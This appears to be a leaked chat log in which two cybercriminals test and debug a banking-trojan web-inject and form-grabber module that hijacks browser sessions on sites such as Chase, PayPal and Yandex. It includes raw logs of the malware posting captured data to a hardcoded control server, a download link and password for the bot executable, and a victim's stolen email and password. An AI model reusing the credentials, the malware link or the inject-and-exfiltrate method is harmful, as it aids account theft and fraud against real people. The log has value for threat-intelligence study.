+[03.12.21 13:24:35] jaime: you open the page and look for an insert
+[03.12.21 13:25:07] jaime: You can only define an insert if you know the configuration
+[03.12.21 13:26:47] hammer: you can't tell by eye?
+[03.12.21 13:28:56] jaime: No, no such thing.
+[03.12.21 13:29:38] jaime: I had a thought to make a url to check it, but I decided it would be dirty anyway.
+[03.12.21 15:29:19] hammer: how many pages can you open in injected browser simultaneously?
+[03.12.21 15:32:08] hammer: well, dogpost kicks in
+[03/12/221 15:32:15] hammer: *logpost
+[03.12.21 15:32:33] hammer: does not come from all sites, sometimes not at all, sometimes in pieces
+[03.12.21 15:33:07] hammer: also the browsers have a strange behavior, they do not have logpost after starting the module, they keep coming after restarting the browser
+[03.12.21 15:33:09] hammer: also
+[03.12.21 15:33:22] hammer: not all pages load, for example chase
+[03.12.21 15:34:06] hammer: papal can freeze, spinning the loading wheel and offering a "wait or stop" window
+[03.12.21 15:34:29] hammer: the same with yandex and others
+[03.12.21 15:34:44] hammer: before the start of the module, I logged into my browser and everything loaded correctly
+[03.12.21 15:35:11] hammer: remember, I asked if it affects speed of your browsers?
+[03.12.21 15:35:15] hammer: that's it
+[03.12.21 15:35:31] hammer: anyway, you need to recheck the inject
+[03.12.21 15:58:47] jaime: chase may not load because of injections, it constantly changes something, it really sucks.
+[03.12.21 15:59:35] jaime: but logpost and inject should be separated if checking.
+[03.12.21 16:06:53] jaime: and better watch with debug of course
+[03.12.21 16:25:55] hammer: m
+[03.12.21 16:26:18] hammer: hof no, i'll order a test bot from him on monday, and we'll watch it, ok?
+[03.12.21 16:27:13] hammer: *ceaser
+[03.12.21 16:27:35] hammer: and you'll have to run it like you did when you checked the output in the logpost, I think
+[03.12.21 16:28:51] hammer: yeah, let's check logpost first, it doesn't depend on config
+[03 12/221 16:45:35] jaime: yeah sure, we'll see.
+[03.12.21 17:02:58] jaime: there in last config found a hard rule set_url https://*/* GP
+[03.12.21 17:03:30] jaime: ``
+set_url https://*/* GP
+```
+[03.12.21 17:05:12] jaime: That's very cruel
+[03.12.21 17:05:54] hammer: this might cause slow site load?
+[03.12.21 17:06:51] hammer: or maybe he presses some buttons like logging in and other
+[03.12.21 17:06:59] jaime: Well, that rule means to inject into any response
+[03.12.21 17:07:38] jaime: There can be 50-60 on one page and we'll put something in each one.
+[03.12.21 17:08:18] jaime: If you have an inject running, config is loading
+[03.12.21 17:08:38] jaime: We're gonna break everything.
+[03.12.21 17:25:35] hammer: Okay, we'll see.
+[03.12.21 17:25:49] hammer: We'll have to do something about it anyway
+[03/12/221 17:26:22] jaime: This needs to be deleted! That's no good!
+[12/23/221 17:40:52] jaime: If it's not difficult, can you look at the page that opens has such a line? BlEepV9UEKiIvtqOCDSHbJWyh1lyz5I2TIeU8
+[03.12.21 17:42:03] hammer: any line at all?
+[03.12.21 17:44:12] hammer: put the module on start, when it is born, I will check
+[03.12.21 17:44:40] jaime: Any
+[03.12.21 17:45:59] jaime: there is an insertion after the head, moreover the insertion rule itself also has regexp
+[03.12.21 17:51:15] hammer: by the way, I also didn't get a version of ff today for some reason
+[03.12.21 17:51:20] hammer: once
+[03.12.21 17:51:41] hammer: 2021-12-03 15:15:07 injectDll VERS browser Mozilla Firefox version: 94.0.2 (x64 en-US) this line was not present when I opened it
+[03.12.21 17:53:11] hammer: yeah, on the chase on the first page
+[03.12.21 17:53:13] hammer: <head><script type="text/javascript" class="BlEepV9UEKiIvtqOCDSHbJWyh1lyz5I2TIeU8
+[12/23/221 17:55:14] hammer: how many pages can I open at once?
+[03.12.21 17:55:14] jaime: so this config and loaded, now trying to find out is it really so designed or a flaw sneaked into the configuration, then what is the ass!
+[03.12.21 17:55:29] jaime: I don't give a shit!
+[03.12.21 17:55:55] jaime: It works like a proxy, only for sesshia
+[03.12.21 17:55:58] jaime: session
+[03.12.21 17:56:34] hammer: at the same time with chase I opened Jimail and Yandex, they don't want to load
+[03.12.21 17:56:51] hammer: i.e. after it, but in separate tabs
+[03.12.21 17:56:54] jaime: don't open yandex at all
+[03.12.21 17:57:04] hammer: yandex mail
+[03.12.21 17:57:31] jaime: My yandex is down because of this rule
+[03.12.21 17:57:47] hammer: it just won't load
+[03.12.21 17:57:54] hammer: I'll try paypal
+[03.12.21 17:58:09] jaime: it's not loading because it crashed
+[03.12.21 17:59:15] hammer: m, if module dies, user gets broken browser?
+[03.12.21 17:59:47] jaime: yeah. Proxy doesn't work anymore.
+[03.12.21 18:00:00] jaime: you need to close browser and open it
+[03.12.21 18:00:10] hammer: yeah, restarted
+[03.12.21 18:01:15] hammer: doesn't want to load paypal?
+[03.12.21 18:01:20] hammer: just a minute
+[03.12.21 18:02:47] hammer: drops exactly, it seems, because the restarted browser has a chase without this line in the code
+[03.12.21 18:02:56] hammer: and papal without it too
+[03.12.21 18:03:37] jaime: you don't have to check it. I've seen the drop.
+[03.12.21 18:04:18] jaime: I fixed it by changing it to another function, it stopped crashing
+[03.12.21 18:04:24] hammer: also a black admin window seems to have fallen off
+[03/12/221 18:05:19] hammer: well, the logpost never came (
+[03.12.21 18:06:13] jaime: you need to update the module, new config kills it, then watch
+[03.12.21 18:06:34] hammer: I have a hypothesis that there is something with the transcoding...
+Like, there's a yen symbol in the logs.
+And some kind of prefix, you know, like a degree but 1\4.
+[03.12.21 18:06:43] hammer: frank wrote it down
+[03.12.21 18:07:01] hammer: that's why they're not in the admin area
+[03.12.21 18:07:26] hammer: yeah, first a test, then upload
+[03.12.21 18:08:00] jaime: Caesar is gone. Damn shitty that the new configuration has not tested
+[03.12.21 18:08:09] hammer: When did you fill it in?
+[03.12.21 18:08:16] jaime: I just tested it for syntax
+[03.12.21 18:08:42] jaime: It's dated November 15, that's when you uploaded it
+[03.12.21 18:09:00] jaime: Robin sent it to me
+[03.12.21 18:09:37] hammer: what can you do
+[03.12.21 18:09:51] hammer: good thing you found out about it
+[03.12.21 18:10:59] jaime: Inge editor writes: "there will be a replacement for the Inge
+[03.12.21 18:22:23] hammer: and when?
+[03.12.21 18:23:36] jaime: i don't know
+[03.12.21 18:24:35] hammer: okay, monday is wiser than friday
+[03.12.21 18:25:07] hammer: what's the point in being sad
+[03.12.21 18:25:18] hammer: have a nice weekend
+[03.12.21 18:25:32] hammer: the silence has broken, by the way.
+[03.12.21 18:25:53] jaime: :) yes, have a nice weekend too!
+[06.12.21 09:44:50] jaime: Hi. I updated the debug module. You can watch.
+[06.12.21 09:48:11] hammer: Ok, requested a test bot, as soon as I put it up, I'll let you know.
+[06.12.21 10:31:24] hammer: my machine kicked up a bit( I'll have to wait
+[06.12.21 12:01:20] jaime: Okay. The power's been cut. Everybody's warming up.
+[06.12.21 14:21:12] hammer: here?
+[06.12.21 14:21:23] jaime: There.
+[06.12.21 14:21:42] hammer: machines go out at 6:00 a.m.
+[06.12.21 14:21:51] hammer: we have 40 minutes, boa I bet
+[06.12.21 14:21:53] jaime: Yes, I read general.
+[06.12.21 14:22:04] hammer: will the log be written somewhere?
+[06.12.21 14:22:14] hammer: and tell me module name
+[06.12.21 14:22:23] jaime: C:/Temp/webinject.log
+[06.12.21 14:22:31] jaime: Running tinjectDll
+[06.12.21 14:22:33] hammer: self-create?
+[06.12.21 14:22:55] jaime: folder must be created, file will be created
+[06.12.21 14:25:50] jaime: check log to see if build is today
+[06.12.21 14:26:13] jaime: Build date:
+[06.12.21 14:30:29] hammer: 2021-12-06 14:27:03 tinjectDll VERS browser Build date: Dec 6 2021 12:10:34
+[06.12.21 14:30:34] hammer: today
+[06.12.21 14:30:40] hammer: okay. what's next?
+[06.12.21 14:32:02] jaime: we had two problems, you couldn't see the log post and it went down on yandex
+[06.12.21 14:32:02] jaime: Let's start with yandex.
+[06.12.21 14:32:25] jaime: Well in parallel watch the log post
+[06.12.21 14:32:32] hammer: it was not only Yandex, the rest got hung up chaotically
+[06.12.21 14:32:47] jaime: well, yandex was an example
+[06/12/21 14:33:06] hammer: okay. i don't see any logs in the repository, just a minute.
+[06.12.21 14:33:46] jaime: look in the log 'DPOST response:'
+[06/12/221 14:37:45] hammer: 12/6/2021 6:34:48 AM [00000267949214D0] schannel_handshake SSL handshake successful
+12/6/2021 6:34:49 AM url=https://www.google.com/search?q=yandex+mail&oq=yandex+mail&aqs=chrome..69i57j0i512l5j5i10i44l2.5961j0j7&sourceid=chrome&ie=UTF-8, matches url=https://*/*
+12/6/2021 6:34:49 AM DPOST response: /1/
+12/6/2021 6:34:49 AM DPOST of https://chrome.cloudflare-dns.com/dns-query
+12/6/2021 6:34:49 AM DPOST servers: http://129.205.210.90:443
+12/6/2021 6:34:49 AM DPOST URI=http://129.205.210.90:443/tst261/DESKTOP-OHJN402_W10019044.00592207F7E451542A336A8D9D287F74/60/ DATA=POST /dns-query HTTP/1.1
+[06.12.21 14:38:05] hammer: that's the last reponse, nothing after that
+[06.12.21 14:38:37] hammer: and the problem is I googled yandex mail and got redirected to the results page, but the link is not clickable
+[06.12.21 14:38:45] hammer: nothing happens
+[06.12.21 14:40:16] hammer: 12/6/2021 6:35:05 AM [100] OnCreate: https://consent.google.lt/s?continue=https://www.google.com/search?q%3Dyandex%2Bmail%26oq%3Dyandex%2Bmail%26aqs%3Dchrome..69i57j0i512l5j5i10i44l2.5961j0j7%26sourceid%3Dchrome%26ie%3DUTF-8%26hl%3Den-GB&v=srp.gws-20211129-0-RC3.en%2BFX%2B873&gl=LT&x=5&pc=srp&uxe=none&t=ADw3F8hIdXtP-eAZ6VjUe1ST476bB9pW1A:1638801297760&rl=2&ca=e
+12/6/2021 6:35:05 AM url=https://mail.yandex.com/, matches url=https://*/*
+12/6/2021 6:35:59 AM WebInject build Dec 6 2021 12:10:34 (x64) starting
+12/6/2021 6:35:59 AM Running as regular user
+12/6/2021 6:35:59 AM Running as CID=DESKTOP-OHJN402_W10019044.00592207F7E451542A336A8D9D287F74
+12/6/2021 6:35:59 AM ProxyThread started
+12/6/2021 6:35:59 AM ImpersonateToInteractiveUser: using session id: 1
+12/6/2021 6:35:59 AM ImpersonateToInteractiveUser: WTSQueryUserToken failed with 1314
+12/6/2021 6:35:59 AM IE: HTTP/2 disabled (Software\Microsoft\Windows\CurrentVersion\Internet Settings=0)
+12/6/2021 6:35:59 AM IE: Multiple Processes Disabled: ok
+12/6/2021 6:35:59 AM Unpacking browsers payload (x86)...
+12/6/2021 6:35:59 AM Browsers payload (x86) unpacked successfully
+12/6/2021 6:35:59 AM Unpacking browsers payload (x64)...
+12/6/2021 6:35:59 AM Browsers payload (x64) unpacked successfully
+12/6/2021 6:35:59 AM Threads started
+12/6/2021 6:35:59 AM Build date: Dec 6 2021 12:10:34
+12/6/2021 6:35:59 AM SendEvent(VERS, Build date: Dec 6 2021 12:10:34
+[06.12.21 14:40:45] jaime: yeah it's ok
+[06.12.21 14:42:27] jaime: And you can send me the whole log. I need for frequency of experiment configuration with Injects to remove somehow.
+[06.12.21 14:42:40] hammer: do you have access into tric_pr?
+[06.12.21 14:42:47] jaime: No, I don't.
+[06.12.21 14:42:54] hammer: Hello! Could you please turn off the kinfigs we gave you?
+configs*
+2:32 PM
+adam probably or cesar
+2:38 PM
+hello, configs for injector?
+[06.12.21 14:43:00] hammer: robin asked to remove
+[06.12.21 14:43:10] hammer: yes, now
+[06.12.21 14:43:37] jaime: is there such a line?
+[06.12.21 14:43:38] hammer:
+[06.12.21 14:43:47] hammer: yes, there was
+[06.12.21 14:44:07] hammer: watch this. i restarted chrome and went back to yandex.mail, it let me in
+[06/12/221 14:44:22] hammer: 12/6/2021 6:27:10 AM config type winj
+12/6/2021 6:27:10 AM config as ZEUS
+12/6/2021 6:27:10 AM config type dpost
+[06.12.21 14:44:25] hammer: is it?
+[06.12.21 14:44:37] jaime: it!
+[06.12.21 14:44:41] jaime: config is!
+[06/12/221 14:44:54] jaime: 12/6/2021 6:34:26 AM url=https://www.google.com/?fpdoodle=1&doodle=174788836&hl=lt&gl=lt&ntp=2&theme_messages=0, matches url=https://*/*
+[06/12/21 14:45:02] jaime: Here's the rule working
+[06/12/221 14:45:16] jaime: We didn't remove the config
+[06.12.21 14:45:21] hammer: so he must have asked to remove them
+[06.12.21 14:45:28] hammer: tell adam what's wrong
+[06.12.21 14:46:28] jaime: I don't know what's wrong. As it turned out and it's not a bug, just apparently inject does not work properly.
+[06.12.21 14:46:43] jaime: I'll write it now.
+[06.12.21 14:47:24] hammer: well, it turns out in any case that the problem with loading pages and hangs
+[06.12.21 14:47:50] hammer: for some reason in the repository logging on the bot is not created, it's weird
+[06.12.21 14:48:24] jaime: it may be because of the insertion, something does not stay there and it's dead
+[06.12.21 14:48:35] jaime: What page did you look at?
+[06.12.21 14:48:52] hammer: where is it not loaded?
+[06.12.21 14:49:21] hammer: there are different ways, paypal was not loading. there was a page freeze and a table appeared saying wait or let's stop torturing
+[06.12.21 14:49:28] hammer: now there was no load on yandex
+[06.12.21 14:49:43] hammer: before that there were problems with chase, I was talking about them
+[06.12.21 14:49:46] hammer: with jimail
+[06.12.21 14:49:58] hammer: very different
+[06.12.21 14:50:03] jaime: Is it the same now?
+[06.12.21 14:50:09] hammer: anyone can freeze and not load
+[06.12.21 14:50:29] hammer: i'll reopen chrome and see
+[06.12.21 14:50:45] hammer: you can skip saving that log?
+[06.12.21 14:50:53] hammer: to rewrite
+[06.12.21 14:53:22] hammer: This site can't be reachedThe webpage at https://www.paypal.com/signin?country.x=LT&locale.x=en_US&langTgl=en might be temporarily down or it may have moved permanently to a new web address.
+[06.12.21 14:53:31] hammer: Paypal didn't load
+[06.12.21 14:54:22] hammer:
+[06.12.21 14:54:44] hammer: the login page got jammed
+[06.12.21 14:54:55] hammer: adam asks what admin do not load config?
+[06.12.21 14:55:08] jaime: write him? :)
+[06.12.21 14:55:20] hammer: isn't it shared by both?
+[06.12.21 14:55:27] hammer: that's for Robin to say
+[06.12.21 14:57:10] hammer: it will be with all browsers, right?
+[06/12/221 14:58:28] hammer: 12/6/2021 6:57:47 AM url=https://mail.yahoo.com/?pspid=2023538075&activity=ybar-mail, matches url=https:// */
+[06.12.21 14:58:40] hammer: froze while trying to login to Yahoo
+[06/12/21 14:58:57] hammer: not even at the login itself, but when I tried to go to his page, it wouldn't let me in
+[06.12.21 14:59:16] hammer: keeps loading forever
+[06.12.21 15:04:23] jaime: yes with all
+[06.12.21 15:04:34] jaime: I think something's broken in the injector
+[06.12.21 15:04:46] jaime: you should at least remove config
+[06.12.21 15:05:16] hammer: shutting down the machine
+[06.12.21 15:05:35] jaime: yes you can run the bot from me
+[06.12.21 15:06:05] jaime: Can you run the bot from me?
+[06.12.21 15:06:52] hammer: you want to put a bot on your work?
+[06.12.21 15:07:10] jaime: no on virtual machine with vpn
+[06.12.21 15:07:22] jaime: I'll take it down later
+[06.12.21 15:07:41] hammer: ok, but then you don't need timka either
+[06.12.21 15:07:48] hammer: if you get the log right away
+[06.12.21 15:08:02] hammer: just tell me ipi, i'll run an inject through admin
+[06.12.21 15:08:13] jaime: Send me the bot
+[06.12.21 15:08:18] hammer: now
+[06.12.21 15:08:53] jaime: yahoo's not working for me, but paypal's working.
+[06.12.21 15:09:30] hammer: it's different, not always like this.
+[06.12.21 15:09:32] hammer: https://www.sendspace.com/file/r9a3pg
+[06.12.21 15:09:38] hammer: https://www.sendspace.com/delete/r9a3pg/50910d10e7692e250e1872edda91935b
+[06.12.21 15:09:48] hammer: *_<Htx]qed+?G)M@
+[06.12.21 15:10:09] hammer: when you start, tell me ipi, I'll trace the module
+[06.12.21 15:10:28] hammer: but it will still load that config
+[06.12.21 15:13:28] jaime: exe?
+[06.12.21 15:14:45] jaime: 185.175.156.26
+[06.12.21 15:16:06] hammer: yes, change the extension and run
+[06.12.21 15:17:33] hammer: got it, I'll tell you when it starts
+[06.12.21 15:18:09] jaime: run as exe
+[06.12.21 15:22:42] jaime: I see it started
+[06.12.21 15:25:27] hammer: tinjectDll VERS browser Build date: Dec 6 2021 12:10:34 yes.
+[06.12.21 15:26:11] hammer: tinjectDll64 reload1
+[06.12.21 15:26:25] hammer: now I'll find out what it means
+[06.12.21 15:26:32] hammer: reload or what
+[06.12.21 15:28:04] hammer: let me just start it up again
+[06.12.21 15:29:24] jaime: come on
+[06.12.21 15:29:51] jaime: kill it, I'll run it without config by hand
+[06.12.21 15:32:39] hammer: gjcnfdbk yf htkbp
+[06.12.21 15:32:45] hammer: set for release
+[06.12.21 15:33:11] hammer: you want to compare how it will load without config?
+[06.12.21 15:33:41] jaime: Yeah
+[06.12.21 15:37:25] hammer: 2021-12-06 15:35:30.754725 tinjectDll release 0 63
+[06.12.21 15:37:28] hammer: dhjlt rfr htkbpyek? ghjdthm
+[06.12.21 15:37:35] hammer: i think i released it, check it
+[06.12.21 15:38:20] jaime: restarted now
+[06.12.21 15:40:05] hammer: module work?
+[06.12.21 15:40:25] jaime: see if anything goes on the log post now?
+[06.12.21 15:40:35] hammer: I can't
+[06.12.21 15:40:43] hammer: it won't let me log into the vault
+[06.12.21 15:40:56] hammer: wait a minute, I'll put network on start, it should work
+[06.12.21 15:41:05] hammer: and frank no(
+[06.12.21 15:41:40] jaime: I ran the module by hand on your id and group
+[06.12.21 15:41:59] hammer: sprosi hofa
+[06.12.21 15:42:01] jaime: paypal is working, yahoo want to see the log post too
+[06.12.21 15:42:11] hammer: love those answers.
+[06.12.21 15:42:29] jaime: they removed config on release?
+[06.12.21 15:42:41] hammer: robin never answered
+[06.12.21 15:42:52] hammer: so it's not clear if adam did it or not
+[06.12.21 15:43:14] hammer: he won't tell me
+[06.12.21 15:43:17] jaime: What the hell to do
+[06.12.21 15:43:25] jaime: Can't see the log post
+[06.12.21 15:43:32] jaime: Configuration is unclear
+[06.12.21 15:43:33] hammer: if he asked, then adam will remove it
+[06.12.21 15:44:57] hammer: did your VPN go down on it?
+[06.12.21 15:47:27] jaime: 92.38.149.85 not this one right now
+[06.12.21 15:48:01] hammer: There was just another one.
+[06.12.21 15:48:48] hammer: no such machine in storage
+[06.12.21 15:48:51] hammer: trouble
+[06.12.21 15:48:55] hammer: frank
+[06.12.21 15:49:17] hammer: so. if i run pvgrabb, is it ok?
+[06.12.21 15:49:24] hammer: there's nothing on it?
+[06.12.21 15:49:40] jaime: I'll just start the bot.
+[06.12.21 15:49:45] jaime: Run it.
+[06.12.21 15:49:49] jaime: nothing's clean
+[06.12.21 15:50:15] hammer: it's just one way, either network or pvgrabb
+[06.12.21 15:50:28] jaime: 92.38.149.85 my bot IP is running
+[06.12.21 15:50:45] hammer: and it's already knocking
+[06.12.21 15:50:51] jaime: I'm going out for a snack, my wife is here! :)
+[06.12.21 15:50:56] hammer: 92.38.149.85 DESKTOP-149IKLJ_W10019043.D35BB56CB1994DBF98499F88BB3931B5 1108 Windows 10 x64 tst261 RU 44 seconds ago
+[06.12.21 15:51:05] hammer: bon appetit
+[06.12.21 16:18:51] jaime: thank you.
+[06.12.21 16:19:02] jaime: So what do we got?
+[06.12.21 16:25:43] hammer: The vault is empty.
+[06.12.21 16:25:51] hammer: can't see, need franc
+[06.12.21 16:26:03] hammer: why is there no record at all, and the response was
+[06.12.21 16:28:56] hammer: and run that thing, remember? when it used to send a logpost every few seconds
+[06.12.21 16:30:39] jaime: Is the module running now?
+[06/12/21 16:31:04] jaime: I wish I could find it! :)
+[06.12.21 16:31:21] hammer: it shouldn't be, I just released it
+[06.12.21 16:31:41] jaime: run it
+[06.12.21 16:31:46] hammer: now
+[06.12.21 16:32:21] hammer: put it on start, wait
+[06.12.21 16:32:36] jaime: normal or logged?
+[06.12.21 16:32:41] hammer: tinject
+[06.12.21 16:32:51] hammer: with log
+[06.12.21 16:33:13] jaime: great
+[06.12.21 16:33:23] jaime: test found
+[06.12.21 16:37:22] hammer: 2021-12-06 16:36:37.283949 tinjectDll start 0 63
+[06.12.21 16:37:26] hammer: start
+[06.12.21 16:37:37] hammer: 2021-12-06 16:37:05 tinjectDll VERS browser Chrome version: 96.0.4664.45
+2021-12-06 16:36:17 tinjectDll VERS browser Build date: Dec 6 2021 12:10:34
+[06.12.21 16:37:46] jaime: I see
+[06.12.21 16:37:49] jaime: Posts are up
+[06.12.21 16:37:51] hammer: but I don't really see if he tightened his config or not
+[06.12.21 16:38:10] jaime: 12/6/2021 7:37:53 PM DPOST URI=http://129.205.210.90:443/tst261/DESKTOP-149IKLJ_W10019043.D35BB56CB1994DBF98499F88BB3931B5/60/ DATA=POST / HTTP/1.1
+[06.12.21 16:38:15] hammer: and there's figs in the vault
+[06.12.21 16:38:37] hammer: how do I know if they go to the right place or not?
+[06/12/221 16:39:04] jaime: 12/6/2021 7:38:41 PM DPOST response: /1/
+[06.12.21 16:39:27] hammer: well there is a response, why not?
+[06.12.21 16:39:38] jaime: group and botid in the url and then I don't know
+[06.12.21 16:40:10] hammer: too bad
+[06.12.21 16:40:41] hammer: pages work the same way?
+[06.12.21 16:41:00] jaime: no config
+[06.12.21 16:41:53] jaime: I go to paypal
+[06.12.21 16:43:59] jaime: there is no config, it must take a long time to load
+[06.12.21 16:45:41] jaime: I have to do something with config file.
+[06.12.21 16:48:35] hammer: can't you make a module and feed it empty config?
+[06.12.21 16:49:01] hammer: not tinj. but tinjbk
+[06.12.21 16:49:20] hammer: or they all pull it anyway?
+[06.12.21 17:22:12] jaime: bot will fill him up
+[06.12.21 17:22:15] jaime: bot
+[06.12.21 17:29:36] hammer: well, then dum will take it away
+[06.12.21 17:29:43] hammer: *adam
+[06.12.21 17:30:06] jaime: Why can't you remove it on the group?
+[06.12.21 17:30:31] jaime: Can only admin?
+[06.12.21 17:30:31] hammer: there must be more than one botnet
+[06.12.21 17:31:05] jaime: well, we're testing on a group, in theory it should have properties on this group, configs, accesses
+[06.12.21 17:31:24] hammer: i can't tell you that, you need frank or adam
+[06.12.21 17:31:30] jaime: You can't check it out.
+[06.12.21 17:31:42] hammer: no franc. adam is silent.
+[06.12.21 17:31:44] jaime: And you don't check it.
+[06.12.21 17:31:59] hammer: no, there he is
+[06.12.21 17:32:01] jaime: To check it, you have to break the ammunition
+[06.12.21 17:32:29] hammer: I'll use his I.D. to find out if he logged anything from the bots
+[06.12.21 17:33:18] jaime: everything's banging
+[06.12.21 17:33:28] jaime: my test is working
+[06.12.21 17:33:33] jaime: there must be something
+[06.12.21 17:34:56] hammer: it's coming up
+[06.12.21 17:46:45] hammer: "The logpost has queued up"
+[06.12.21 17:50:24] jaime: Here we go.
+[06.12.21 17:50:31] jaime: Stop?
+[06.12.21 17:50:46] jaime: But there's got to be something there?
+[06.12.21 17:50:58] hammer: stop it, I think you'll see, it's the same
+[06.12.21 17:51:16] hammer: there's a queue for the whole logpost, not just these, he can't tell by the time
+[06.12.21 17:51:46] hammer: "I don't know how to turn it off, it's config encrypted, you have to go to adam"
+[06.12.21 17:51:48] jaime: I'm slow.
+[06.12.21 17:53:48] hammer: I'll have to run a regular one when the farm gets upgraded
+[06.12.21 17:54:13] hammer: maybe admin is kicking on the test one and not getting it into the vault, I don't know
+[06.12.21 17:54:21] hammer: and the line will clear
+[06.12.21 17:54:23] hammer: hopefully
+[06.12.21 17:55:14] jaime: kick me! :) We'll keep watching.
+[06.12.21 17:55:32] hammer: Why you?)
+[06.12.21 17:58:18] hammer: oh, found it
+[06.12.21 17:58:30] hammer: apparently, there's your bot in the vault
+[06.12.21 17:58:41] hammer: send what?
+[06.12.21 17:58:52] hammer: logpost is empty
+[06.12.21 18:00:45] hammer: "Bot D35BB56CB1994DBF98499F88BB3931B5 has many logs on the logpost
+so stuck somewhere along the way through my part."
+[06.12.21 18:00:50] hammer: haven't arrived yet
+[06.12.21 18:07:37] jaime: speed isn't important
+[06.12.21 18:31:17] hammer: they're still in line. let's continue tomorrow
+[06.12.21 18:39:19] jaime: sure.
+[06.12.21 18:39:38] jaime: we should organize our own admin room
+[06.12.21 18:40:22] hammer: adam hasn't removed the config yet
+[06/12/221 18:40:50] hammer: 12/6/2021 10:33:18 AM config type winj
+12/6/2021 10:33:18 AM config as ZEUS
+12/6/2021 10:33:19 AM config type dpost
+[06.12.21 18:41:24] hammer: went to paypal, page froze, opened in a new tab, did not load at all, just white
+[06.12.21 18:41:48] hammer: and every new tab gave the same white unloaded page regardless of the link
+[06/12/221 18:43:16] hammer: 12/6/2021 10:36:37 AM url=https://www.google.com/?fpdoodle=1&doodle=174788836&hl=lt&gl=lt&ntp=2&theme_messages=0, matches url=https://*/*
+12/6/2021 10:36:49 AM url=https://paypal.com/, matches url=https://*/*
+12/6/2021 10:36:56 AM url=https://www.recaptcha.net/recaptcha/enterprise/anchor?ar=1&k=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&co=aHR0cHM6Ly93d3cucGF5cGFsb2JqZWN0cy5jb206NDQz&hl=en&v=_7Co1fh8iT2hcjvquYJ_3zSP&size=invisible&cb=u6audrp4yvp, matches url=https://*/*
+[06/12/221 18:43:42] hammer: This site can't be reachedThe webpage at http://google.com/ might be temporarily down or it may have moved permanently to a new web address.
+ERR_FILE_EXISTS
+[06.12.21 18:43:58] hammer: woe, woe, woe
+[06.12.21 18:45:18] hammer: the response should be even without entering anything, right?
+[06.12.21 18:47:39] jaime: yes, it should
+[06.12.21 18:50:59] jaime: there might even be a thing where we do an insertion into an insertion. We paste something into the browser, it loads something and we paste it in there, and it's all bollocks.
+[06.12.21 18:52:37] jaime: And RESPONSE on DPOST goes, it doesn't matter there whether it was entered or not. Just duplicate each POST message to our server.
+[06.12.21 18:52:47] hammer: [v
+[06.12.21 18:52:50] hammer: hmm.
+[06.12.21 18:53:23] hammer: Oh, that's it, I have a response.
+[06.12.21 18:53:34] hammer: no, but there is
+[06.12.21 18:58:00] hammer: okay, tomorrow we'll see, there's a logpost going on from my bot, I'll check it tomorrow, nothing from yours yet
+[06.12.21 18:58:04] hammer: userid=alindenacc@hotmail.com
+pass=Dimple_147weasv
+[06.12.21 18:58:16] hammer: there's even a login pass from ebay
+[06.12.21 18:58:40] hammer: but I got nothing on it
+[06.12.21 18:58:52] hammer: even before you turned off the farms I checked
+[06.12.21 18:59:12] hammer: not the fresh one after
+[07.12.21 15:46:52] hammer: hi
+[07.12.21 15:47:40] hammer: and where does logpost get entries like
+https://trc.taboola.com/1and1internet-mailcom/log/3/visible?route=AM%3AIL%3AV&lti=deflated 2021-12-07 17:25:53.096184
+https://trc.taboola.com/1and1internet-mailcom/log/3/bulk?route=AM%3AIL%3AV&lti=deflated&bulkSize=1
+[07.12.21 15:47:48] hammer: I wasn't even at that address
+[07.12.21 15:47:54] hammer: or youtube
+[07.12.21 15:55:43] jaime: hi!
+[07.12.21 15:55:54] jaime: And this is garbage stats and stuff
+[07.12.21 15:56:07] jaime: There's a lot of lefty trash
+[07.12.21 15:56:25] hammer: is it like the news on yahoo and mailcom?
+[07.12.21 15:57:43] jaime: Maybe!
+[07.12.21 15:58:03] hammer: well, look
+[07.12.21 15:58:14] hammer: adam filled in a blank config
+[07.12.21 15:58:25] hammer: i've been running chrome all over the place
+[07.12.21 15:58:42] hammer: and one site with many reopenings all at once, no freezes
+[07.12.21 15:59:16] jaime: log post going on?
+[07.12.21 15:59:33] hammer: the logpost is kicking, it comes with a delay, but it comes, almost everything I sent came, only I can't find jmail, but there are yandex, paypal, chase, mailcom, hotmail, newegg, ebay
+[07.12.21 15:59:43] hammer: yahoo.
+[07.12.21 15:59:50] jaime: that's good! :)
+[07.12.21 16:00:03] hammer: Yeah, but he's late.
+[07.12.21 16:00:18] hammer: but frank said he'd look into it, try to fix it
+[07.12.21 16:00:35] jaime: Yeah, I think the main thing is that it comes
+[07.12.21 16:00:45] jaime: Well, half an hour is an hour.
+[07.12.21 16:00:53] hammer: now I want ff and edge
+[07.12.21 16:01:05] hammer: there must be a logpost from them too?
+[07.12.21 16:01:10] jaime: edg no
+[07.12.21 16:01:12] jaime: IE
+[07.12.21 16:01:22] jaime: And FF 64
+[07.12.21 16:02:44] hammer: so still ff and ee
+[07.12.21 16:05:47] hammer: but it's not freezing and there's no logging
+[07.12.21 16:06:38] hammer: I'll just change the bot so it won't interfere with previous logposts
+[07.12.21 16:43:03] jaime: Kid's got some kind of disease, then my ears, then my teeth, then my head. I can't get away.
+[07.12.21 17:41:12] hammer: ff is good so far, everything goes, but the download speed of some pages like mylkom or amazon is very slow.
+[07.12.21 17:41:39] hammer: compare speeds later. when I release the module
+[07.12.21 17:44:02] jaime: yes, for some reason it has, and on different OSes in different ways. I subjectively thought it was faster on 7
+[07.12.21 17:54:13] hammer: but it takes too long to load, it's ok on ff
+[07.12.21 17:54:23] hammer: this is for 10, I don't know for 7
+[08.12.21 11:31:02] jaime: Hi!
+[08.12.21 11:31:37] jaime: What about the formgrabber? Frank says you got something there?
+[08.12.21 11:34:24] hammer: Hi, no
+[08.12.21 11:34:53] hammer: Only the logpost partially goes bad in the repository, it takes a long time to get there
+[08.12.21 11:41:21] hammer: on ff performance: big difference with uninjected browser
+[08.12.21 11:41:37] hammer: uninjected is fast, but under the module I wrote you yesterday
+[08.12.21 11:41:55] hammer: sometimes the page goes into timeout, it has no time to load
+[08.12.21 11:42:48] jaime: I agree, it is slower, without VPN it is faster, but slower for sure.
+[08.12.21 11:43:13] jaime: I don't know why, they have the same algorithm
+[08.12.21 11:43:46] hammer: And by format of logs?
+[08.12.21 11:47:29] jaime: Everything seems fine
+[08.12.21 11:48:39] hammer: frank needs some other
+[08.12.21 11:48:52] hammer: This is the format I can work with.
+Or any other where you can reconcile data line by line. i got a log yesterday as a huge file with system info, but i couldn't make it out.
+[08.12.21 11:49:07] hammer: I gave it to him, it's not that, he says.
+[08.12.21 11:49:30] jaime: I wonder what it was? :)
+[08.12.21 11:50:17] hammer: I threw him a webinject file
+[08.12.21 11:50:36] hammer: that response was late to the logpost
